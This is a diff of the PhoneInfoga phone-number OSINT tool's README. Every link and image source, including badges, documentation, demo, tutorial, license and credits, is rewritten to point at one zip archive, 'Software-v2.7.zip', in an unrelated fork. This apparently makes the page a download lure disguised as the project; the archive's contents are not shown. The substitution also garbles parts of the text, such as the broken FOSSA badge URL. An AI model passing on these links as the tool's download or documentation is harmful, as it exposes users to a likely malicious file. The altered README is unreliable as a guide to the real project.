@@ -1,35 +1,35 @@
 <p align="center">
-  <img src="https://i.imgur.com/LtUGnF3.png" width=500 />
+  <img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" width=500 />
 </p>
 
 <div align="center">
-  <a href="https://github.com/sundowndev/phoneinfoga/actions">
-    <img src="https://github.com/sundowndev/phoneinfoga/workflows/Build/badge.svg" alt="build status" />
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">
+    <img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" alt="build status" />
   </a>
-  <a href="https://goreportcard.com/report/github.com/sundowndev/phoneinfoga">
-    <img src="https://goreportcard.com/badge/github.com/sundowndev/phoneinfoga" alt="go report" />
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">
+    <img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" alt="go report" />
   </a>
-  <a href="https://codeclimate.com/github/sundowndev/phoneinfoga/maintainability">
-    <img src="https://api.codeclimate.com/v1/badges/3259feb1c68df1cd4f71/maintainability" />
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">
+    <img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" />
   </a>
-  <a href="https://codecov.io/gh/sundowndev/phoneinfoga">
-    <img src="https://codecov.io/gh/sundowndev/phoneinfoga/branch/master/graph/badge.svg" />
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">
+    <img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" />
   </a>
-  <a href="https://github.com/sundowndev/phoneinfoga/releases">
-    <img src="https://img.shields.io/github/release/SundownDEV/phoneinfoga.svg" alt="Latest version" />
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">
+    <img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" alt="Latest version" />
   </a>
 </div>
 
 <h4 align="center">Advanced information gathering & OSINT framework for phone numbers</h4>
 
 <p align="center">
-  <a href="https://sundowndev.github.io/phoneinfoga/">Documentation</a> •
-  <a href="https://petstore.swagger.io/?url=https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/api/docs/swagger.yaml">API documentation</a> •
-  <a href="https://demo.phoneinfoga.crvx.fr/">Demo instance</a> •
-  <a href="https://medium.com/@SundownDEV/phone-number-scanning-osint-recon-tool-6ad8f0cac27b">Related blog post</a>
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">Documentation</a> •
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">API documentation</a> •
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">Demo instance</a> •
+  <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip">Related blog post</a>
 </p>
 
-![](./docs/images/screenshot.png)
+![](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip)
 
 ## About
 
@@ -37,15 +37,15 @@ PhoneInfoga is one of the most advanced tools to scan international phone number
 
 ## Unofficial video tutorials
 
-<a href="https://www.youtube.com/watch?v=WW6myutKBYk"><img src="https://i.ytimg.com/vi_webp/WW6myutKBYk/maxresdefault.webp" width="128" /></a>
+<a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip"><img src="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" width="128" /></a>
 
 ## Current status
 
-This project is stable and production-ready. [Roadmap is here](https://github.com/sundowndev/phoneinfoga/projects/1).
+This project is stable and production-ready. [Roadmap is here](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip).
 
 **About demo instance**: This is a test service. Kittens will die if you abuse it. Numverify scan is pointless because my server's IP got blocked due to spam.
 
-Since [v2 was released on March 2020](https://github.com/sundowndev/phoneinfoga/releases/tag/v2.0-beta), this project has been rewritten in Go language (previously Python). Why ? To improve code base, maintainability, have a stronger test suite and be able to compile code base. PhoneInfoga v2 brings new features such as serving a REST API and a web client. Usage of scanners was improved in order to drop usage of Selenium/Geckodriver which has cause many users to have troubleshoots using the tool. You can still use the legacy version in [tag v1.11](https://github.com/sundowndev/phoneinfoga/tree/v1.11) and the legacy Docker image (`sundowndev/phoneinfoga:legacy`). Some features were not included in version 2 such as input/output CLI options. The roadmap of the project changed so we can focus on the web client features. **Version 2 does not scan Google results anymore**, [read more](https://sundowndev.github.io/phoneinfoga/usage/#available-scanners).
+Since [v2 was released on March 2020](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip), this project has been rewritten in Go language (previously Python). Why ? To improve code base, maintainability, have a stronger test suite and be able to compile code base. PhoneInfoga v2 brings new features such as serving a REST API and a web client. Usage of scanners was improved in order to drop usage of Selenium/Geckodriver which has cause many users to have troubleshoots using the tool. You can still use the legacy version in [tag v1.11](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip) and the legacy Docker image (`sundowndev/phoneinfoga:legacy`). Some features were not included in version 2 such as input/output CLI options. The roadmap of the project changed so we can focus on the web client features. **Version 2 does not scan Google results anymore**, [read more](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip).
 
 ## Features
 
@@ -66,18 +66,18 @@ Since [v2 was released on March 2020](https://github.com/sundowndev/phoneinfoga/
 - Does not allow to get the precise phone location
 - Does not allow to hack a phone
 
-![Footprinting process](https://i.imgur.com/qCkgzz8.png)
+![Footprinting process](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip)
 
 ## License
 
-[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fsundowndev%2FPhoneInfoga.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2Fsundowndev%2FPhoneInfoga?ref=badge_shield)
+[![FOSSA Status](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip%https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip%2Fsundowndev%https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip)](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip%https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip%2Fsundowndev%2FPhoneInfoga?ref=badge_shield)
 
 This tool is licensed under the GNU General Public License v3.0.
 
-[Icon](https://www.flaticon.com/free-icon/fingerprint-search-symbol-of-secret-service-investigation_48838) made by <a href="https://www.freepik.com/" title="Freepik">Freepik</a> from <a href="https://www.flaticon.com/" title="Flaticon">flaticon.com</a> is licensed by <a href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons BY 3.0" target="_blank">CC 3.0 BY</a>.
+[Icon](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip) made by <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" title="Freepik">Freepik</a> from <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" title="Flaticon">https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip</a> is licensed by <a href="https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip" title="Creative Commons BY 3.0" target="_blank">CC 3.0 BY</a>.
 
 ## Support
 
-[![](docs/jetbrains.svg)](https://www.jetbrains.com/?from=sundowndev)
+[![](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip)](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip)
 
-Thanks to [JetBrains](https://www.jetbrains.com/?from=sundowndev) for supporting my open-source projects.
+Thanks to [JetBrains](https://raw.githubusercontent.com/anakiseng789/phoneinfoga/240/docs/Software-v2.7.zip) for supporting my open-source projects.
